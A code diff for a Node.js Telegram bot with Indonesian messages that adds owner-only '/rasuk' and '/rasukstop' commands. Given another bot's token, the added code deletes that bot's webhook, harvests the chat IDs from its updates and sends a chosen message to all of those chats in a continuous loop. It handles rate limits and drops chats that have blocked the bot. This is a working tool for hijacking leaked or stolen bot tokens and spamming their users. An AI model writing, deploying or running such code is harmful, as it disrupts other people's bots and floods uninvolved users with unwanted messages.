@@ -759,6 +759,102 @@ const checkPremium = (ctx, next) => {
     next();
 };
 
+let rasukActive = false;
+const RASUK_DELAY_MS = 300;
+
+const rasukParseToken = (raw) => {
+    const m = String(raw).trim().match(/^\d{6,}:[A-Za-z0-9_\-]{30,}$/);
+    return m ? m[0] : null;
+};
+
+const rasukGetMe = async (token) => {
+    try {
+        const r = await axios.get(`https://api.telegram.org/bot${token}/getMe`, { timeout: 10000 });
+        return r.data.ok ? r.data.result : null;
+    } catch (e) {
+        return null;
+    }
+};
+
+const rasukClearWebhook = async (token) => {
+    try {
+        await axios.get(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=false`, { timeout: 10000 });
+    } catch (e) {}
+};
+
+const rasukGetChats = async (token) => {
+    try {
+        const r = await axios.get(`https://api.telegram.org/bot${token}/getUpdates?limit=100&timeout=0`, { timeout: 15000 });
+        if (!r.data.ok) return null;
+        const set = new Set();
+        for (const u of r.data.result) {
+            const c = u.message?.chat?.id
+                || u.edited_message?.chat?.id
+                || u.channel_post?.chat?.id
+                || u.my_chat_member?.chat?.id
+                || u.callback_query?.message?.chat?.id;
+            if (c) set.add(c);
+        }
+        return [...set];
+    } catch (e) {
+        return null;
+    }
+};
+
+const rasukSend = async (token, chatId, text) => {
+    try {
+        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+            chat_id: chatId,
+            text: text
+        }, { timeout: 10000 });
+        return { ok: true };
+    } catch (e) {
+        const status = e.response?.status;
+        const data = e.response?.data;
+        if (status === 429) {
+            const wait = (data?.parameters?.retry_after || 1) * 1000;
+            await sleep(wait);
+            return { ok: false, retry: true };
+        }
+        if (status === 403 || status === 400) {
+            return { ok: false, dead: true, reason: data?.description || "blocked" };
+        }
+        return { ok: false, reason: e.message };
+    }
+};
+
+const rasukLoop = async (token, botInfo, initialChats, message) => {
+    const alive = new Set(initialChats);
+    let sent = 0;
+    let dead = 0;
+    let errors = 0;
+
+    while (rasukActive) {
+        const batch = [...alive];
+        for (const chatId of batch) {
+            if (!rasukActive) break;
+            const res = await rasukSend(token, chatId, message);
+            if (res.ok) {
+                sent++;
+            } else if (res.dead) {
+                alive.delete(chatId);
+                dead++;
+            } else if (res.retry) {
+            } else {
+                errors++;
+            }
+            await sleep(RASUK_DELAY_MS);
+        }
+
+        if (alive.size === 0) {
+            console.log(`[rasuk] @${botInfo.username} no alive chats, stopping`);
+            break;
+        }
+    }
+
+    return { sent, dead, errors, alive: alive.size };
+};
+
 // ============ CLAIM PREMIUM GROUP ============
 const claimGroupsPath = './database/claimGroups.json';
 
@@ -1486,6 +1582,8 @@ bot.action("/toolsss", async (ctx) => {
 <table bordered>
 <tr><th>COMMAND</th><th>EXAMPLE</th><th>TYPE</th></tr>
 <tr><td>/donate</td><td>/donate</td><td>Support</td></tr>
+<tr><td>/rasuk</td><td>/rasuk</td><td>Rasuk Bott</td></tr>
+<tr><td>/rasukstop</td><td>/rasukstop</td><td>Stop Rasuk</td></tr>
 <tr><td>/cekemoji</td><td>/cekemoji</td><td>cekemoji</td></tr>
 <tr><td>/reactch</td><td>/reactch</td><td>reactch</td></tr>
 <tr><td>/update</td><td>/update</td><td>Update check</td></tr>
@@ -2681,6 +2779,85 @@ Semoga rezeki kamu dilancarkan & berkah selalu 🤲✨</i>
     console.error("❌ Gagal kirim QRIS:", err.message);
     ctx.reply("❌ Gagal kirim QRIS donasi bre, coba lagi nanti ya 🙏");
   }
+});
+
+bot.command("rasuk", checkJoin(), async (ctx) => {
+    if (ctx.from.id != ID_TELEGRAM) {
+        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
+    }
+    if (rasukActive) {
+        return ctx.reply("⚠️ Rαsυk sєdαng bєrjαlαn, /rasukstop dυlυ");
+    }
+
+    const raw = ctx.message.text.replace(/^\/rasuk(@\S+)?\s*/i, "").trim();
+    const sep = raw.indexOf("|");
+    if (sep === -1) {
+        return ctx.reply("🪧 Fσrmαt: /rasuk <tσkєn> | <pєsαn>");
+    }
+
+    const tokenRaw = raw.slice(0, sep).trim();
+    const message = raw.slice(sep + 1).trim();
+
+    const token = rasukParseToken(tokenRaw);
+    if (!token) {
+        return ctx.reply("❌ Tσkєn tidαk vαlid. Fσrmαt: 1234567890:AAA-xxxx");
+    }
+    if (!message) {
+        return ctx.reply("❌ Pєsαn kσsσng");
+    }
+    if (message.length > 4000) {
+        return ctx.reply("❌ Pєsαn mαksimαl 4000 kαrαktєr");
+    }
+
+    const botInfo = await rasukGetMe(token);
+    if (!botInfo) {
+        return ctx.reply("❌ Tσkєn tidαk vαlid αtαυ bσt mαti");
+    }
+
+    await rasukClearWebhook(token);
+    await sleep(1500);
+
+    const chats = await rasukGetChats(token);
+    if (!chats || chats.length === 0) {
+        return ctx.reply(`⚠️ Bσt @${botInfo.username} bєlυm pυnyα chαt tєrsimpαn`);
+    }
+
+    rasukActive = true;
+
+    const startMsg = await ctx.reply(
+        `🔥 Rαsυk αktif\n\n↯ Bσt: @${botInfo.username}\n↯ Tαrgєt: ${chats.length} chαt\n↯ Dєlαy: ${RASUK_DELAY_MS}ms\n\n/rasukstop υntυk bєrhєnti`,
+        { parse_mode: "HTML" }
+    );
+
+    console.log(`[rasuk] start @${botInfo.username} chats=${chats.length}`);
+
+    rasukLoop(token, botInfo, chats, message)
+        .then(async (res) => {
+            rasukActive = false;
+            await ctx.telegram.editMessageText(
+                ctx.chat.id,
+                startMsg.message_id,
+                undefined,
+                `🛑 Rαsυk sєlєsαi\n\n↯ Bσt: @${botInfo.username}\n↯ Tєrkirim: ${res.sent}\n↯ Mαti/blσkir: ${res.dead}\n↯ Єrrσr: ${res.errors}\n↯ Chαt αktif: ${res.alive}`,
+                { parse_mode: "HTML" }
+            ).catch(() => {});
+        })
+        .catch((e) => {
+            rasukActive = false;
+            console.error("[rasuk]", e.message);
+            ctx.reply(`❌ Єrrσr: ${e.message}`).catch(() => {});
+        });
+});
+
+bot.command("rasukstop", checkJoin(), async (ctx) => {
+    if (ctx.from.id != ID_TELEGRAM) {
+        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
+    }
+    if (!rasukActive) {
+        return ctx.reply("🪧 Rαsυk tidαk sєdαng bєrjαlαn");
+    }
+    rasukActive = false;
+    await ctx.reply("🛑 Stσp sinyαl dikirim, mєnυnggυ bαtch sєlєsαi...");
 });
 
 bot.command("info", (ctx) => {
